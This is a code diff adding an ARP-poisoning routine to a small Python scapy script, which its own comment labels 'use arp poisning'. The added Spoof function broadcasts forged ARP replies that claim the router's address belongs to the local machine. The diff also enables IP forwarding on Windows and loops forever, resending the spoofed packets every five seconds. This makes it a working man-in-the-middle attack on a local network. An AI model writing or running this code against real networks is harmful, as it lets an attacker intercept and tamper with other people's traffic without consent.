@@ -1,7 +1,7 @@
 # use arp poisning :)
 from scapy.all import Ether, ARP, srp, send
 
-
+from time import sleep
 
 def iproute_windows(status=True):
     # if not enables please to check if service is disabled
@@ -21,6 +21,26 @@ def get_mac(ip):
         return ans[0][1].src
 
 
-# iproute_windows()
-get_mac('192.168.1.1')
 
+
+
+
+def Spoof(router_ip):
+    """
+    Spoofs the target IP address to the router IP address
+    """
+    local_mac = get_mac('192.168.1.107')
+    router_mac = get_mac(router_ip)
+    arp_msg = ARP(pdst='192.168.1.255', hwdst='ff:ff:ff:ff:ff:ff', psrc=router_ip, hwsrc=local_mac,op='is-at')
+    send(arp_msg,verbose=0,count=7)
+    print("[+] Sent to {} : {} is-at {}".format("192.168.1.255", router_ip, router_mac))
+
+
+
+
+
+iproute_windows()
+while True:
+    print('[+] Sleeping')
+    sleep(5) 
+    Spoof('192.168.1.1')
